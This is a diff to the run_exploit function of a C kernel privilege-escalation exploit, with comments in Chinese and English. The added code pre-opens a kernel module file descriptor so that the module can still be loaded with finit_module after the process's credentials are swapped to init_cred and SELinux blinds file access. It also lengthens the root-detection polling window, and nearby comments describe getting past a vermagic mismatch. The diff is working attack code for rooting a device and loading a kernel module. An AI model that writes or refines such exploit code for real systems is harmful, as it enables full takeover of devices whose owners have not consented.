@@ -624,12 +624,31 @@ int run_exploit(int argc, char **argv) {
 #define SYS_finit_module 273
 #endif
         int root_seen = 0, ksu_done = 0;
+        /* mt85: 预开 KO fd — C 落地后 child 变 kernel SID 致盲, open(ksu.ko)
+         * 会被 SELinux 拒绝 (root_alive.txt 写失败实证)。fd 在 R 落地后、
+         * 致盲前预开, gate 触发时直接 finit_module(kfd) — fd 权限不随 SID 变。 */
+        int mt85_kfd = -1;
+        {
+          char *ko_pre = getenv("PSELECT_KO");
+          if (ko_pre && *ko_pre) {
+            mt85_kfd = open(ko_pre, O_RDONLY);
+            pr_info("mt85: pre-open KO fd=%d errno=%d\n", mt85_kfd, errno);
+            fflush(stdout);
+          }
+        }
         /* mt73: sticky CapEff-full flag survives status-file blinding after C
          * swaps cred to init_cred; SELinux kernel-SID blocks file I/O, so the
          * old live CapEff read is lost exactly when we need it most. */
         int mt73_capeff_seen = 0;
         int mt73_c_signal_sent = 0;
-        for (int poll_i = 0; poll_i < 2400; poll_i++) {  /* 8 min 窗口 */
+        /* mt84: 轮询窗口环境可调 — FWRQ 分钟级延迟把 C 落地拖到 8min 之外
+         * (2026-09-07 实证: euid=0 已落地但 gate 已停), 默认 6000=20min */
+        int mt84_polls = 6000;
+        {
+          char *pe = getenv("PSELECT_CHILD_POLLS");
+          if (pe && *pe) mt84_polls = atoi(pe);
+        }
+        for (int poll_i = 0; poll_i < mt84_polls; poll_i++) {  /* mt84: 20min 窗口 */
           uid_t ruid, euid, suid;
           gid_t rgid, egid, sgid;
           getresuid(&ruid, &euid, &suid);
@@ -722,7 +741,7 @@ int run_exploit(int argc, char **argv) {
           if (root_seen) {
             char *ko = getenv("PSELECT_KO");
             if (ko && !ksu_done && (poll_i % 5) == 0) {
-              int kfd = open(ko, O_RDONLY);
+              int kfd = (mt85_kfd >= 0) ? mt85_kfd : open(ko, O_RDONLY);
               if (kfd >= 0) {
                 /* mt50: vermagic 不匹配 (ko=5.10.252-dirty vs 本机 5.10.209) →
                  * 内核自带正规绕道: finit_module flags. 已指令级实证
